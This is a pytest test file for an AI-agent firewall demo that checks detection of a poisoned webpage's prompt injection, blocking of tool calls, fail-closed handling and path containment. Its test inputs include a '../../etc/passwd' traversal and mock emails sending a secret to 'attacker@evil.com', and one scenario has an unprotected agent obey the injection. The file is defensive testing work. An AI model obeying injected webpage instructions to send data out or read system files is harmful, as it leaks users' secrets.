"""
Automated Unit and Integration Tests for AgentShield Poisoned Webpage Demo Agent.

Test Coverage:
- Normal webpage processing
- Poisoned webpage threat detection
- Dummy file path containment
- Mock email zero-network confinement
- Firewall OFF unprotected execution behavior
- Firewall ON authorization & mediation
- BLOCK prevents tool execution
- ASK_HUMAN prevents execution before approval
- Fail-Closed on AgentShield error / unavailable
- Direct tool bypass prevention in protected mode
- E2E 3-scenario pipeline execution
"""

from __future__ import annotations

import json
from pathlib import Path
from unittest.mock import MagicMock, patch

import pytest

from demos.poisoned_webpage_agent.agent import PoisonedWebpageDemoAgent
from demos.poisoned_webpage_agent.agentshield_adapter import (
    AdapterExecutionResult,
    AgentShieldAdapter,
)
from demos.poisoned_webpage_agent.config import settings
from demos.poisoned_webpage_agent.mock_tools import (
    DirectBypassError,
    MockToolManager,
    PathEscapeError,
    mock_tool_manager,
)
from demos.poisoned_webpage_agent.run_demo import run_all_scenarios
from demos.poisoned_webpage_agent.webpages import NORMAL_WEBPAGE, POISONED_WEBPAGE


class TestDemoMockTools:
    """Tests verifying mock tools safety and non-bypassability."""

    def setup_method(self):
        mock_tool_manager.set_protection(False)
        mock_tool_manager.invocation_history.clear()

    def test_dummy_file_path_restrictions_accepts_valid(self):
        content = mock_tool_manager.read_dummy_file("dummy_secret.txt", authorized_by_shield=False)
        assert "CONFIDENTIAL_DEMO_TOKEN" in content
        assert len(mock_tool_manager.invocation_history) == 1
        assert mock_tool_manager.invocation_history[0].status == "SUCCESS"

    def test_dummy_file_path_restrictions_rejects_escape(self):
        with pytest.raises(PathEscapeError):
            mock_tool_manager.read_dummy_file("../../etc/passwd", authorized_by_shield=False)

        assert any(
            rec.status == "REJECTED_PATH_ESCAPE" for rec in mock_tool_manager.invocation_history
        )

    def test_mock_email_never_transmits_network_sockets(self):
        """Verifies that mock email only writes locally and produces zero socket calls."""
        res = mock_tool_manager.send_mock_email(
            to="test@example.com",
            message="Test message",
            subject="Test Subject",
            authorized_by_shield=False,
        )
        assert res["delivered"] is True
        assert res["transport"] == "simulated_local_memory"

        # Verify local JSON log contains record
        assert settings.email_log_file.exists()
        with open(settings.email_log_file, "r", encoding="utf-8") as f:
            log_data = json.load(f)
            assert any(entry["to"] == "test@example.com" for entry in log_data["sent_emails"])

    def test_direct_tool_bypass_prevented_when_protection_enabled(self):
        """Verifies that calling mock tools directly in protected mode raises DirectBypassError."""
        mock_tool_manager.set_protection(True)

        with pytest.raises(DirectBypassError):
            mock_tool_manager.read_dummy_file("dummy_secret.txt", authorized_by_shield=False)

        with pytest.raises(DirectBypassError):
            mock_tool_manager.send_mock_email("attacker@evil.com", "stolen", authorized_by_shield=False)

        # Confirm bypass attempts were logged
        assert any(
            rec.status == "ATTEMPTED_DIRECT_BYPASS" for rec in mock_tool_manager.invocation_history
        )


class TestAgentShieldAdapter:
    """Tests verifying AgentShield adapter scanning, decision enforcement, and fail-closed design."""

    def setup_method(self):
        self.adapter = AgentShieldAdapter()
        mock_tool_manager.set_protection(True)
        mock_tool_manager.invocation_history.clear()

    def test_normal_webpage_scan_has_no_injection(self):
        summary = self.adapter.scan_webpage_content(NORMAL_WEBPAGE.content, NORMAL_WEBPAGE.url)
        assert summary.has_injection is False
        assert summary.findings_count == 0

    def test_poisoned_webpage_threat_detection_flags_critical_injection(self):
        summary = self.adapter.scan_webpage_content(POISONED_WEBPAGE.content, POISONED_WEBPAGE.url)
        assert summary.has_injection is True
        assert summary.highest_severity in ("HIGH", "CRITICAL")
        assert any("prompt_injection" in str(f.get("threat_type", "")).lower() for f in summary.findings)

    def test_block_decision_prevents_tool_execution(self):
        # Scan poisoned webpage first to taint active provenance
        self.adapter.scan_webpage_content(POISONED_WEBPAGE.content, POISONED_WEBPAGE.url)

        verdict = self.adapter.evaluate_and_execute(
            tool_name="send_mock_email",
            action_name="send",
            arguments={"to": "attacker@evil.com", "message": "secret"},
        )

        assert verdict.decision == "BLOCK"
        assert verdict.executed is False
        assert verdict.status == "BLOCKED"
        assert "SECURITY_BLOCKED" in (verdict.error_message or "")

    def test_ask_human_prevents_execution_without_prior_approval(self):
        """Verifies that when ASK_HUMAN decision is returned, tool execution is stopped without auto-approval."""
        import uuid
        from agentshield.contracts.decision import SecurityDecision
        from agentshield.contracts.enums import Decision, RiskLevel
        from datetime import UTC, datetime

        mock_ask_human_decision = SecurityDecision(
            request_id=uuid.uuid4(),
            decision=Decision.ASK_HUMAN,
            risk_score=50.0,
            risk_level=RiskLevel.MEDIUM,
            reasons=["Human approval required for file reading."],
            evaluated_at=datetime.now(UTC),
            evaluation_duration_ms=1.5,
        )

        with patch("agentshield.security.engine.security_engine.evaluate_action", return_value=mock_ask_human_decision):
            verdict = self.adapter.evaluate_and_execute(
                tool_name="read_dummy_file",
                action_name="read",
                arguments={"path": "dummy_secret.txt"},
            )

            assert verdict.decision == "ASK_HUMAN"
            assert verdict.status == "REQUIRES_APPROVAL"
            assert verdict.executed is False
            assert "approval required" in verdict.error_message.lower()

    def test_agentshield_unavailable_fails_closed(self):
        """Verifies that unexpected errors in evaluation immediately result in BLOCK and zero tool execution."""
        with patch("agentshield.security.engine.security_engine.evaluate_action", side_effect=RuntimeError("Database disconnected")):
            verdict = self.adapter.evaluate_and_execute(
                tool_name="read_dummy_file",
                action_name="read",
                arguments={"path": "dummy_secret.txt"},
            )

            assert verdict.decision == "BLOCK"
            assert verdict.status == "BLOCKED"
            assert verdict.executed is False
            assert "FAIL_CLOSED" in verdict.reasons[0]


class TestPoisonedWebpageDemoAgentScenarios:
    """Tests executing the 3 demo scenarios."""

    def setup_method(self):
        self.adapter = AgentShieldAdapter()

    def test_scenario_1_normal_webpage_firewall_on(self):
        agent = PoisonedWebpageDemoAgent(adapter=self.adapter, firewall_on=True, use_mock_model=True)
        ctx = agent.run(NORMAL_WEBPAGE, scenario_id="test_scenario_1")

        assert ctx.firewall_mode == "PROTECTED"
        assert ctx.injection_detected is False
        assert ctx.malicious_tool_attempted is False
        assert ctx.malicious_tool_executed is False
        assert ctx.normal_task_completed is True
        assert len(ctx.final_response) > 50

    def test_scenario_2_poisoned_webpage_firewall_off_unprotected(self):
        agent = PoisonedWebpageDemoAgent(adapter=self.adapter, firewall_on=False, use_mock_model=True)
        ctx = agent.run(POISONED_WEBPAGE, scenario_id="test_scenario_2")

        assert ctx.firewall_mode == "UNPROTECTED"
        assert ctx.malicious_tool_attempted is True
        assert ctx.malicious_tool_executed is True  # Unprotected agent falls for injection
        assert ctx.normal_task_completed is True

    def test_scenario_3_poisoned_webpage_firewall_on_protected(self):
        agent = PoisonedWebpageDemoAgent(adapter=self.adapter, firewall_on=True, use_mock_model=True)
        ctx = agent.run(POISONED_WEBPAGE, scenario_id="test_scenario_3")

        assert ctx.firewall_mode == "PROTECTED"
        assert ctx.injection_detected is True
        assert ctx.malicious_tool_attempted is True
        assert ctx.malicious_tool_blocked is True
        assert ctx.malicious_tool_executed is False  # AgentShield blocked execution!
        assert ctx.normal_task_completed is True
        assert "AgentShield Security Notice" in ctx.final_response

    def test_live_mode_requires_api_key_error(self):
        """Verifies that requesting live mode without an API key produces a clear setup error."""
        with patch.object(settings, "openai_api_key", None):
            agent = PoisonedWebpageDemoAgent(adapter=self.adapter, firewall_on=True, use_mock_model=False)
            ctx = agent.run(NORMAL_WEBPAGE)
            assert any("Setup Error" in err for err in ctx.errors)

    def test_e2e_all_three_scenarios_pipeline(self):
        """Verifies run_all_scenarios executes cleanly and creates results files."""
        results = run_all_scenarios(use_mock_model=True)
        assert len(results) == 3

        report_file = settings.results_dir / "TEST_REPORT.md"
        assert report_file.exists()
        report_text = report_file.read_text(encoding="utf-8")
        assert "Quantitative Scenario Comparison" in report_text
        assert "PASS (ATTACK CONTAINED)" in report_text
